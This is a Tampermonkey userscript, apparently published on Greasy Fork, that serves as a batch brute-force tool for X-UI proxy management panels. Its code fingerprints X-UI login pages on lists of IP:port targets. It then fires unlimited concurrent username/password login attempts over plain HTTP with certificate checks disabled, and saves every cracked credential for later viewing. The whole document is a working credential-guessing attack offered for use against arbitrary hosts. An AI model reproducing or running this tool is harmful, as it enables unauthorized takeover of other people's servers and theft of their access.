// ==UserScript==
// @name         XUI面板批量爆破工具
// @namespace    http://tampermonkey.net/
// @version      2.8
// @description  批量/单IP检测XUI面板爆破登录（强制HTTP+修复停止功能+纯油猴集成）
// @author       Your Name
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_notification
// @grant        GM_registerMenuCommand
// @connect      *
// @match        *://*/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_registerMenuCommand
// @grant        unsafeWindow
// @license      Proprietary - Only for personal use, no modifications or redistributions allowed. 
//               The code may not be modified, copied, distributed, or used for derivative works without explicit permission.
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/558633/XUI%E9%9D%A2%E6%9D%BF%E6%89%B9%E9%87%8F%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7.user.js
// @updateURL https://update.greasyfork.org/scripts/558633/XUI%E9%9D%A2%E6%9D%BF%E6%89%B9%E9%87%8F%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // ========== 全局状态管理 ==========
    const GLOBAL_STATE = {
        isRunning: false,          // 是否正在爆破
        stopFlag: false,           // 停止标志
        currentTarget: "",         // 当前处理的目标
        currentProgress: 0,        // 当前进度(%)
        totalTargets: 0,           // 总目标数
        completedTargets: 0,       // 已完成目标数
        successCount: 0,           // 成功数
        failCount: 0,              // 失败数
        activeThreads: 0,          // 活跃线程数
        threadPool: [],            // 线程池
        maxThreads: 10,            // 默认线程数（无限制，用户可自定义任意值）
        panelVisible: false,       // 面板是否可见
        panel: null                // 面板DOM引用
    };

    // ========== 配置区域 ==========
    const CONFIG = {
        timeout: 15000,            // 超时时间(毫秒)
        retries: 1,                // 重试次数
        enableNotification: true,  // 是否启用通知
        bruteInterval: 0           // 爆破间隔设为0，最大化并发
    };

    // ========== 工具函数 ==========
    // 颜色配置
    const Colors = {
        GREEN: 'color: #4CAF50;',
        RED: 'color: #f44336;',
        YELLOW: 'color: #ffc107;',
        BLUE: 'color: #2196F3;',
        CYAN: 'color: #00bcd4;',
        END: ''
    };

    // 格式化时间
    function formatTime() {
        return new Date().toLocaleString('zh-CN', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        }).replace(/\//g, '-');
    }

    // 控制台日志封装
    function log(type, message) {
        const time = `[${formatTime()}]`;
        const logMessage = `${time} ${message}`;
        let colorStyle = Colors.END;

        switch(type) {
            case 'success': colorStyle = Colors.GREEN; break;
            case 'error': colorStyle = Colors.RED; break;
            case 'warn': colorStyle = Colors.YELLOW; break;
            case 'info': colorStyle = Colors.BLUE; break;
            case 'debug': colorStyle = Colors.CYAN; break;
        }

        console.log(`%c${logMessage}`, colorStyle);
        appendLog(logMessage, type);
    }

    // 通知函数
    function showNotification(title, text) {
        if (CONFIG.enableNotification) {
            GM_notification({
                title: title,
                text: text,
                timeout: 5000,
                onclick: () => window.focus()
            });
        }
    }

    // 休眠函数
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // 更新实时状态（修复停止后状态更新）
    function updateStatus() {
        const statusEl = document.getElementById('xui-status');
        if (!statusEl) return;

        // 修复：停止标志触发时强制更新为已停止
        const realIsRunning = GLOBAL_STATE.isRunning && !GLOBAL_STATE.stopFlag;

        statusEl.innerHTML = `
            <div style="margin: 5px 0; font-size: 12px;">
                <div>运行状态: ${realIsRunning ? '<span style="color: #4CAF50;">运行中</span>' : '<span style="color: #f44336;">已停止</span>'}</div>
                <div>当前目标: ${GLOBAL_STATE.currentTarget || '无'}</div>
                <div>进度: ${GLOBAL_STATE.currentProgress.toFixed(2)}% (${GLOBAL_STATE.completedTargets}/${GLOBAL_STATE.totalTargets})</div>
                <div>成功数: <span style="color: #4CAF50;">${GLOBAL_STATE.successCount}</span></div>
                <div>失败数: <span style="color: #f44336;">${GLOBAL_STATE.failCount}</span></div>
                <div>活跃线程: ${GLOBAL_STATE.activeThreads}/${GLOBAL_STATE.maxThreads}</div>
                <div>协议: <span style="color: #4CAF50;">强制HTTP</span></div>
            </div>
        `;
    }

    // ========== XUI面板检测（强制HTTP） ==========
    async function checkXuiFingerprint(url) {
        log('debug', `检测XUI指纹: ${url}`);
        // 强制使用HTTP协议，忽略HTTPS
        const httpUrl = url.replace(/^https:/, 'http:');
        return new Promise(resolve => {
            GM_xmlhttpRequest({
                method: 'GET',
                url: httpUrl,
                timeout: CONFIG.timeout,
                ssl: { rejectUnauthorized: false },
                onload: function(response) {
                    if (response.status !== 200) {
                        resolve({ isXui: false, scheme: 'http' }); // 强制返回http
                        return;
                    }

                    const html = response.responseText;
                    let conditionsMet = 0;

                    // XUI特征检测
                    if (html.includes('<title>') &&
                        (html.includes('X-UI') || html.includes('X-UI-YG') ||
                         html.includes('3XUI') || html.includes('登录') ||
                         html.includes('Login') || html.includes('欢迎'))) {
                        conditionsMet++;
                    }

                    const jsFeatures = [
                        '/assets/js/axios-init.js',
                        '/assets/js/langs.js',
                        '/assets/js/util/utils.js',
                        '/assets/js/model/xray.js',
                        '/assets/js/model/models.js',
                        '/assets/js/util/common.js',
                        '/assets/element-ui',
                        '/assets/js/util/index.js',
                        '/assets/Vazirmatn'
                    ];
                    if (jsFeatures.some(feat => html.includes(feat))) {
                        conditionsMet++;
                    }

                    if (html.includes('id="app" v-cloak')) {
                        conditionsMet++;
                    }

                    const headingFeatures = [
                        '<h1>X-UI</h1>',
                        '<h1>欢迎使用X-UI-YG面板</h1>',
                        '<h2 class="title headline zoom">'
                    ];
                    if (headingFeatures.some(feat => html.includes(feat))) {
                        conditionsMet++;
                    }

                    const frameworkFeatures = ['ant-design-vue', 'vue@'];
                    if (frameworkFeatures.some(feat => html.includes(feat))) {
                        conditionsMet++;
                    }

                    const isXui = conditionsMet >= 3;
                    log('debug', `${httpUrl} 指纹检测结果: ${isXui} (匹配特征数: ${conditionsMet})`);
                    resolve({ isXui, scheme: 'http' }); // 强制返回http
                },
                onerror: function() {
                    resolve({ isXui: false, scheme: 'http' }); // 强制返回http
                },
                ontimeout: function() {
                    resolve({ isXui: false, scheme: 'http' }); // 强制返回http
                }
            });
        });
    }

    // ========== 登录尝试（独立线程+强制HTTP） ==========
    async function tryLogin(url, username, password, scheme) {
        if (GLOBAL_STATE.stopFlag) return { success: false, urlUnreachable: true };

        // 强制使用HTTP协议，覆盖传入的scheme
        const forceScheme = 'http';
        const loginUrl = `${forceScheme}://${url}/login`;
        log('info', `尝试登录: ${loginUrl} (${username}:${password})`);

        return new Promise(resolve => {
            GM_xmlhttpRequest({
                method: 'POST',
                url: loginUrl,
                timeout: CONFIG.timeout,
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                data: JSON.stringify({ username, password }),
                ssl: { rejectUnauthorized: false },
                onload: function(response) {
                    if (GLOBAL_STATE.stopFlag) {
                        resolve({ success: false, urlUnreachable: true });
                        return;
                    }

                    try {
                        if (response.status === 200) {
                            const data = JSON.parse(response.responseText);
                            if (data.success === true) {
                                log('success', `登录成功! ${loginUrl} ${username}:${password}`);
                                showNotification('XUI登录成功', `${loginUrl}\n用户名: ${username}\n密码: ${password}`);
                                // 保存成功记录（强制HTTP，无/login，无时间）
                                const successRecords = GM_getValue('xui_success_records', []);
                                // 仅保留http:// + IP:端口，无/login
                                const baseUrl = `${forceScheme}://${url}`;
                                successRecords.push({
                                    url: baseUrl,
                                    username,
                                    password
                                });
                                GM_setValue('xui_success_records', successRecords);
                                GLOBAL_STATE.successCount++;
                                resolve({ success: true, urlUnreachable: false });
                                return;
                            } else {
                                log('warn', `密码错误: ${loginUrl} (${username}:${password})`);
                                resolve({ success: false, urlUnreachable: false });
                                return;
                            }
                        } else {
                            log('warn', `HTTP错误: ${loginUrl} 状态码: ${response.status}`);
                            resolve({ success: false, urlUnreachable: true });
                        }
                    } catch (e) {
                        log('error', `解析响应失败: ${loginUrl} ${e.message}`);
                        resolve({ success: false, urlUnreachable: true });
                    }
                },
                onerror: function(e) {
                    log('error', `请求失败: ${loginUrl} ${e.message}`);
                    resolve({ success: false, urlUnreachable: true });
                },
                ontimeout: function() {
                    log('warn', `请求超时: ${loginUrl}`);
                    resolve({ success: false, urlUnreachable: true });
                }
            });
        });
    }

    // ========== 用户名密码验证多线程处理 ==========
    async function bruteForceCreds(target, scheme, usernames, passwords, attempted) {
        // 生成所有用户名密码组合
        const creds = [];
        for (const username of usernames) {
            for (const password of passwords) {
                const cred = `${username}:${password}`;
                if (!attempted.includes(cred)) {
                    creds.push({ username, password });
                }
            }
        }

        const totalCreds = creds.length;
        let processedCreds = 0;

        // 多线程并发处理用户名密码验证
        async function processCredQueue() {
            while (creds.length > 0 && !GLOBAL_STATE.stopFlag) {
                // 控制并发线程数（用户自定义值）
                if (GLOBAL_STATE.activeThreads >= GLOBAL_STATE.maxThreads) {
                    await sleep(10);
                    continue;
                }

                const { username, password } = creds.shift();
                GLOBAL_STATE.activeThreads++;
                processedCreds++;

                // 更新进度
                GLOBAL_STATE.currentProgress = (GLOBAL_STATE.completedTargets / GLOBAL_STATE.totalTargets) * 100 +
                                              (processedCreds / totalCreds / GLOBAL_STATE.totalTargets) * 100;
                updateStatus();

                try {
                    let success = false;
                    let urlUnreachable = false;
                    const credKey = `${username}:${password}`;

                    // 重试机制
                    for (let i = 0; i < CONFIG.retries; i++) {
                        if (GLOBAL_STATE.stopFlag) break;
                        // 强制传入http协议
                        const result = await tryLogin(target, username, password, 'http');
                        success = result.success;
                        urlUnreachable = result.urlUnreachable;

                        if (success || urlUnreachable) break;
                        await sleep(CONFIG.bruteInterval);
                    }

                    // 记录尝试过的凭证
                    attempted.push(credKey);
                    GM_setValue('xui_brute_progress', {
                        ...GM_getValue('xui_brute_progress', {}),
                        [target]: attempted
                    });

                    if (success) {
                        // 登录成功后清空剩余任务
                        creds.length = 0;
                        break;
                    }

                    if (urlUnreachable) {
                        log('warn', `${target} URL不可访问，终止爆破`);
                        creds.length = 0;
                        GLOBAL_STATE.failCount++;
                        break;
                    }
                } catch (e) {
                    log('error', `处理凭证失败: ${username}:${password} - ${e.message}`);
                    GLOBAL_STATE.failCount++;
                } finally {
                    GLOBAL_STATE.activeThreads--;
                    updateStatus();
                }
            }
        }

        // 启动多线程队列（同时启动多个消费线程）
        const threadWorkers = [];
        // 根据用户自定义线程数启动对应数量的工作线程
        for (let i = 0; i < GLOBAL_STATE.maxThreads; i++) {
            threadWorkers.push(processCredQueue());
        }

        await Promise.all(threadWorkers);

        if (processedCreds === totalCreds && !GLOBAL_STATE.stopFlag) {
            log('warn', `${target} 所有用户名密码组合尝试失败`);
            GLOBAL_STATE.failCount++;
            // 保存失败记录
            const failedRecords = GM_getValue('xui_failed_records', []);
            failedRecords.push({ target, time: formatTime() });
            GM_setValue('xui_failed_records', failedRecords);
        }
    }

    // ========== 单目标爆破函数 ==========
    async function bruteForceSingleTarget(target) {
        if (GLOBAL_STATE.stopFlag) return;

        GLOBAL_STATE.currentTarget = target;
        updateStatus();

        try {
            // 仅检测HTTP协议（强制）
            const { isXui } = await checkXuiFingerprint(`http://${target}`);

            if (!isXui) {
                log('warn', `${target} 非XUI面板，跳过`);
                GLOBAL_STATE.failCount++;
                return;
            }

            // 读取已尝试的凭证
            const progress = GM_getValue('xui_brute_progress', {});
            const attempted = progress[target] || [];

            // 获取用户名/密码列表
            const userInput = document.getElementById('xui-username-input').value.trim();
            const usernames = userInput ? userInput.split('\n').map(u => u.trim()).filter(u => u) : [];

            const passInput = document.getElementById('xui-password-input').value.trim();
            const passwords = passInput ? passInput.split('\n').map(p => p.trim()).filter(p => p) : [];

            // 校验用户名/密码是否为空
            if (usernames.length === 0 || passwords.length === 0) {
                log('error', `${target} - 用户名或密码列表为空，跳过`);
                GLOBAL_STATE.failCount++;
                return;
            }

            // 启动用户名密码多线程验证（强制HTTP）
            await bruteForceCreds(target, 'http', usernames, passwords, attempted);

        } catch (e) {
            log('error', `处理目标 ${target} 出错: ${e.message}`);
            GLOBAL_STATE.failCount++;
        } finally {
            GLOBAL_STATE.completedTargets++;
            GLOBAL_STATE.currentProgress = (GLOBAL_STATE.completedTargets / GLOBAL_STATE.totalTargets) * 100;
            updateStatus();
        }
    }

    // ========== 批量/单IP爆破主函数（修复停止逻辑） ==========
    async function batchBruteForce(targets) {
        // 双重校验：防止重复启动
        if (GLOBAL_STATE.isRunning && !GLOBAL_STATE.stopFlag) {
            alert('当前已有任务在运行！');
            return;
        }

        GLOBAL_STATE.isRunning = true;
        GLOBAL_STATE.stopFlag = false;
        GLOBAL_STATE.totalTargets = targets.length;
        GLOBAL_STATE.completedTargets = 0;
        GLOBAL_STATE.successCount = 0;
        GLOBAL_STATE.failCount = 0;
        GLOBAL_STATE.currentProgress = 0;

        updateStatus();
        log('info', `开始爆破，共 ${targets.length} 个目标，自定义线程数: ${GLOBAL_STATE.maxThreads}（强制HTTP协议）`);

        // 处理所有目标（支持多线程并发处理不同目标）
        const targetPromises = [];
        for (const target of targets) {
            if (GLOBAL_STATE.stopFlag) break;
            targetPromises.push(bruteForceSingleTarget(target));
            // 避免瞬间创建过多目标线程
            await sleep(50);
        }

        await Promise.all(targetPromises);

        // 修复：停止后强制更新状态
        GLOBAL_STATE.isRunning = false;
        GLOBAL_STATE.stopFlag = false;
        updateStatus();
        log('info', `爆破完成！成功: ${GLOBAL_STATE.successCount}, 失败: ${GLOBAL_STATE.failCount}`);
        showNotification('爆破完成', `成功: ${GLOBAL_STATE.successCount}, 失败: ${GLOBAL_STATE.failCount}`);
    }

    // ========== 拖动面板功能 ==========
    function makePanelDraggable(panel, dragHandle) {
        let isDragging = false;
        let offsetX, offsetY;

        dragHandle.addEventListener('mousedown', (e) => {
            isDragging = true;
            offsetX = e.clientX - panel.getBoundingClientRect().left;
            offsetY = e.clientY - panel.getBoundingClientRect().top;
            dragHandle.style.cursor = 'grabbing';
            e.preventDefault();
        });

        document.addEventListener('mousemove', (e) => {
            if (!isDragging) return;
            const newLeft = e.clientX - offsetX;
            const newTop = e.clientY - offsetY;
            panel.style.left = `${newLeft}px`;
            panel.style.top = `${newTop}px`;
            panel.style.right = 'auto';
            panel.style.bottom = 'auto';
        });

        document.addEventListener('mouseup', () => {
            if (isDragging) {
                isDragging = false;
                dragHandle.style.cursor = 'grab';
            }
        });

        document.addEventListener('mouseleave', () => {
            isDragging = false;
            dragHandle.style.cursor = 'grab';
        });
    }

    // ========== 创建主面板（移除悬浮按钮，纯油猴菜单调用） ==========
    function createPanel() {
        // 防止重复创建
        if (GLOBAL_STATE.panel) {
            GLOBAL_STATE.panel.style.display = 'block';
            GLOBAL_STATE.panelVisible = true;
            return;
        }

        // 创建主面板
        const panel = document.createElement('div');
        panel.id = 'xui-brute-panel';
        panel.style.cssText = `
            position: fixed;
            top: 20px;
            left: 20px;
            width: 500px;
            background: #222;
            color: #fff;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0,0,0,0.5);
            z-index: 999999;
            font-family: monospace;
            max-height: 80vh;
            overflow-y: auto;
            display: block;
        `;
        GLOBAL_STATE.panel = panel;
        GLOBAL_STATE.panelVisible = true;

        // 拖动手柄
        const dragHandle = document.createElement('div');
        dragHandle.style.cssText = `
            width: 100%;
            height: 30px;
            line-height: 30px;
            background: #333;
            border-radius: 4px 4px 0 0;
            margin: -15px -15px 15px -15px;
            padding: 0 15px;
            cursor: grab;
            display: flex;
            align-items: center;
            justify-content: space-between;
        `;
        const title = document.createElement('span');
        title.style.cssText = 'color: #4CAF50; font-weight: bold;';
        title.textContent = 'XUI面板爆破工具 v2.8（强制HTTP+无限制线程）';
        dragHandle.appendChild(title);

        // 关闭按钮
        const closeBtn = document.createElement('span');
        closeBtn.textContent = '×';
        closeBtn.style.cssText = 'width: 20px; height: 20px; line-height: 20px; text-align: center; cursor: pointer; color: #fff;';
        closeBtn.addEventListener('click', () => {
            panel.style.display = 'none';
            GLOBAL_STATE.panelVisible = false;
        });
        dragHandle.appendChild(closeBtn);
        panel.appendChild(dragHandle);

        // 目标输入
        const targetDiv = document.createElement('div');
        targetDiv.style.cssText = 'margin-bottom: 10px;';
        const targetLabel = document.createElement('label');
        targetLabel.textContent = '目标 (单IP/批量IP，每行一个 IP:端口/域名:端口):';
        targetLabel.style.cssText = 'display: block; margin-bottom: 5px; font-size: 12px;';
        const targetTextarea = document.createElement('textarea');
        targetTextarea.id = 'xui-target-input';
        targetTextarea.style.cssText = 'width: 100%; height: 80px; padding: 8px; border: none; border-radius: 4px; background: #333; color: #fff; resize: vertical;';
        targetTextarea.placeholder = `单IP示例:
192.168.1.1:8080

批量IP示例:
192.168.1.1:8080
example.com:8443
10.0.0.1:9090

注：工具强制使用HTTP协议，无需输入http/https`;
        targetDiv.appendChild(targetLabel);
        targetDiv.appendChild(targetTextarea);
        panel.appendChild(targetDiv);

        // 用户名输入
        const userDiv = document.createElement('div');
        userDiv.style.cssText = 'margin-bottom: 10px;';
        const userLabel = document.createElement('label');
        userLabel.textContent = '用户名 (每行一个):';
        userLabel.style.cssText = 'display: block; margin-bottom: 5px; font-size: 12px;';
        const userInput = document.createElement('textarea');
        userInput.id = 'xui-username-input';
        userInput.style.cssText = 'width: 100%; height: 80px; padding: 8px; border: none; border-radius: 4px; background: #333; color: #fff; resize: vertical;';
        userInput.placeholder = `例如:
admin
root
test
admin123`;
        userDiv.appendChild(userLabel);
        userDiv.appendChild(userInput);
        panel.appendChild(userDiv);

        // 密码输入
        const passDiv = document.createElement('div');
        passDiv.style.cssText = 'margin-bottom: 10px;';
        const passLabel = document.createElement('label');
        passLabel.textContent = '密码 (每行一个):';
        passLabel.style.cssText = 'display: block; margin-bottom: 5px; font-size: 12px;';
        const passInput = document.createElement('textarea');
        passInput.id = 'xui-password-input';
        passInput.style.cssText = 'width: 100%; height: 80px; padding: 8px; border: none; border-radius: 4px; background: #333; color: #fff; resize: vertical;';
        passInput.placeholder = `例如:
adminpassword
adminpassword1
root123+
123456`;
        passDiv.appendChild(passLabel);
        passDiv.appendChild(passInput);
        panel.appendChild(passDiv);

        // 自定义线程数（无限制）
        const threadDiv = document.createElement('div');
        threadDiv.style.cssText = 'margin-bottom: 10px;';
        const threadLabel = document.createElement('label');
        threadLabel.textContent = '自定义线程数 (无限制，建议根据设备性能设置):';
        threadLabel.style.cssText = 'display: block; margin-bottom: 5px; font-size: 12px;';
        const threadInput = document.createElement('input');
        threadInput.id = 'xui-thread-input';
        threadInput.type = 'number';
        threadInput.style.cssText = 'width: 100%; padding: 8px; border: none; border-radius: 4px; background: #333; color: #fff;';
        threadInput.min = '1';          // 仅限制最小1线程，无上限
        threadInput.value = '10';       // 默认10线程
        threadInput.title = '无线程数上限，建议普通设备设10-50，高性能设备可设100+';
        threadDiv.appendChild(threadLabel);
        threadDiv.appendChild(threadInput);
        panel.appendChild(threadDiv);

        // 状态显示
        const statusDiv = document.createElement('div');
        statusDiv.id = 'xui-status';
        statusDiv.style.cssText = 'margin-bottom: 10px; padding: 10px; background: #333; border-radius: 4px; font-size: 12px;';
        statusDiv.innerHTML = `
            <div>运行状态: <span style="color: #f44336;">未运行</span></div>
            <div>当前目标: 无</div>
            <div>进度: 0.00% (0/0)</div>
            <div>成功数: <span style="color: #4CAF50;">0</span></div>
            <div>失败数: <span style="color: #f44336;">0</span></div>
            <div>活跃线程: 0/10</div>
            <div>协议: <span style="color: #4CAF50;">强制HTTP</span></div>
        `;
        panel.appendChild(statusDiv);

        // 控制按钮
        const btnDiv = document.createElement('div');
        btnDiv.style.cssText = 'display: flex; gap: 10px; margin-bottom: 10px;';

        // 开始按钮
        const startBtn = document.createElement('button');
        startBtn.id = 'xui-start-btn';
        startBtn.textContent = '开始爆破（强制HTTP）';
        startBtn.style.cssText = 'flex: 1; padding: 8px; border: none; border-radius: 4px; background: #4CAF50; color: white; cursor: pointer;';
        startBtn.onclick = async () => {
            // 修复：双重校验运行状态
            const realIsRunning = GLOBAL_STATE.isRunning && !GLOBAL_STATE.stopFlag;
            if (realIsRunning) {
                alert('当前已有任务在运行！');
                return;
            }

            // 获取目标
            const targetText = targetTextarea.value.trim();
            if (!targetText) {
                alert('请输入目标（单IP或批量IP）！');
                return;
            }
            const targets = targetText.split('\n').map(t => t.trim()).filter(t => t);

            // 校验用户名密码
            const userText = userInput.value.trim();
            const passText = passInput.value.trim();
            if (!userText || !passText) {
                alert('用户名和密码列表不能为空！');
                return;
            }

            // 获取自定义线程数（无上限）
            const threadCount = parseInt(threadInput.value);
            if (isNaN(threadCount) || threadCount < 1) {
                alert('线程数必须大于等于1！');
                return;
            }
            GLOBAL_STATE.maxThreads = threadCount;

            // 禁用按钮
            startBtn.disabled = true;
            startBtn.textContent = '运行中...';
            stopBtn.disabled = false;

            // 开始爆破
            await batchBruteForce(targets);

            // 恢复按钮
            startBtn.disabled = false;
            startBtn.textContent = '开始爆破（强制HTTP）';
            stopBtn.disabled = true;
        };
        btnDiv.appendChild(startBtn);

        // 停止按钮（修复停止逻辑）
        const stopBtn = document.createElement('button');
        stopBtn.id = 'xui-stop-btn';
        stopBtn.textContent = '停止爆破';
        stopBtn.style.cssText = 'flex: 1; padding: 8px; border: none; border-radius: 4px; background: #f44336; color: white; cursor: pointer;';
        stopBtn.disabled = true;
        stopBtn.onclick = () => {
            GLOBAL_STATE.stopFlag = true;
            GLOBAL_STATE.isRunning = false; // 强制标记为未运行
            GLOBAL_STATE.activeThreads = 0; // 清空活跃线程
            log('warn', '用户手动停止爆破');
            // 立即更新状态
            updateStatus();
            // 恢复按钮状态
            stopBtn.disabled = true;
            startBtn.textContent = '开始爆破（强制HTTP）';
            startBtn.disabled = false;
        };
        btnDiv.appendChild(stopBtn);
        panel.appendChild(btnDiv);

        // 功能按钮
        const funcBtnDiv = document.createElement('div');
        funcBtnDiv.style.cssText = 'display: flex; gap: 10px; margin-bottom: 10px;';

        // 清空进度
        const clearBtn = document.createElement('button');
        clearBtn.textContent = '清空进度';
        clearBtn.style.cssText = 'flex: 1; padding: 8px; border: none; border-radius: 4px; background: #ff9800; color: white; cursor: pointer; font-size: 12px;';
        clearBtn.onclick = () => {
            if (confirm('确定清空所有爆破进度和记录?')) {
                GM_setValue('xui_brute_progress', {});
                GM_setValue('xui_success_records', []);
                GM_setValue('xui_failed_records', []);
                log('info', '已清空所有进度记录');
                clearLog();
            }
        };
        funcBtnDiv.appendChild(clearBtn);

        // 查看成功记录（核心格式修改）
        const recordBtn = document.createElement('button');
        recordBtn.textContent = '查看成功记录';
        recordBtn.style.cssText = 'flex: 1; padding: 8px; border: none; border-radius: 4px; background: #2196F3; color: white; cursor: pointer; font-size: 12px;';
        recordBtn.onclick = () => {
            const records = GM_getValue('xui_success_records', []);
            if (records.length === 0) {
                alert('暂无成功记录');
                return;
            }

            // 重构记录格式：仅HTTP、无序号、无/login、无时间
            let recordText = 'XUI登录成功记录:\n\n';
            records.forEach(rec => {
                recordText += `${rec.url}\n   用户名: ${rec.username}\n   密码: ${rec.password}\n\n`;
            });

            const recordWindow = window.open('', 'XUI成功记录', 'width: 600px; height: 400px;');
            recordWindow.document.write(`
                <pre style="font-family: monospace; padding: 20px; background: #f5f5f5; white-space: pre-wrap;">
                    ${recordText}
                </pre>
            `);
        };
        funcBtnDiv.appendChild(recordBtn);
        panel.appendChild(funcBtnDiv);

        // 日志区域
        const logLabel = document.createElement('label');
        logLabel.textContent = '运行日志 (最新100条):';
        logLabel.style.cssText = 'display: block; margin-bottom: 5px; font-size: 12px;';
        panel.appendChild(logLabel);

        const logDiv = document.createElement('div');
        logDiv.id = 'xui-log';
        logDiv.style.cssText = 'width: 100%; height: 120px; padding: 8px; border: none; border-radius: 4px; background: #111; color: #fff; font-size: 11px; overflow-y: auto; white-space: pre-wrap;';
        panel.appendChild(logDiv);

        document.body.appendChild(panel);
        makePanelDraggable(panel, dragHandle);
    }

    // 日志追加
    function appendLog(message, type) {
        const logDiv = document.getElementById('xui-log');
        if (!logDiv) return;

        const colorMap = {
            success: '#4CAF50',
            error: '#f44336',
            warn: '#ffc107',
            info: '#2196F3',
            debug: '#00bcd4'
        };

        const color = colorMap[type] || '#fff';
        const logLine = `<span style="color: ${color};">${message}</span>`;

        const lines = logDiv.innerHTML.split('\n').filter(line => line.trim());
        lines.push(logLine);
        if (lines.length > 100) {
            lines.shift();
        }

        logDiv.innerHTML = lines.join('\n');
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    // 清空日志
    function clearLog() {
        const logDiv = document.getElementById('xui-log');
        if (logDiv) logDiv.innerHTML = '';
    }

    // ========== 初始化（纯油猴菜单集成） ==========
    function init() {
        log('info', 'XUI面板爆破工具 v2.8 已加载（强制HTTP协议+无限制自定义线程+纯油猴集成）');

        // 注册油猴菜单命令（核心：移除悬浮按钮，通过油猴菜单打开）
        GM_registerMenuCommand('打开XUI面板爆破工具', () => {
            createPanel();
        }, 'X');

        // 注册查看成功记录的快捷菜单
        GM_registerMenuCommand('查看XUI爆破成功记录', () => {
            const records = GM_getValue('xui_success_records', []);
            if (records.length === 0) {
                alert('暂无成功记录');
                return;
            }

            let recordText = 'XUI登录成功记录:\n\n';
            records.forEach(rec => {
                recordText += `${rec.url}\n   用户名: ${rec.username}\n   密码: ${rec.password}\n\n`;
            });

            const recordWindow = window.open('', 'XUI成功记录', 'width: 600px; height: 400px;');
            recordWindow.document.write(`
                <pre style="font-family: monospace; padding: 20px; background: #f5f5f5; white-space: pre-wrap;">
                    ${recordText}
                </pre>
            `);
        }, 'C');
    }

    // 启动脚本
    init();

})();